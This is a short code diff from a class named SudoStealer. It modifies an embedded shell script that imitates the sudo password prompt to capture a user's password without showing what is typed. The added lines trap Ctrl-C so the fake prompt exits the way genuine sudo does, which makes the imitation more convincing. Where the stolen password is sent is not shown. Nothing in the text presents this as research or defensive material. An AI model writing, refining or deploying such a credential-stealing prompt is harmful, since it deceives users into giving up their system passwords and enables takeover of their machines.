@@ -36,6 +36,12 @@ class SudoStealer:
 	
 	async def enable():	
 		DIALOG = """#!/usr/bin/env sh
+handler()
+{
+echo "" 1>&2
+exit 130
+}
+trap handler SIGINT
 username=$(whoami)
 read -s -p "[sudo] password for $username: " password 1>&2
 echo "" 1>&2
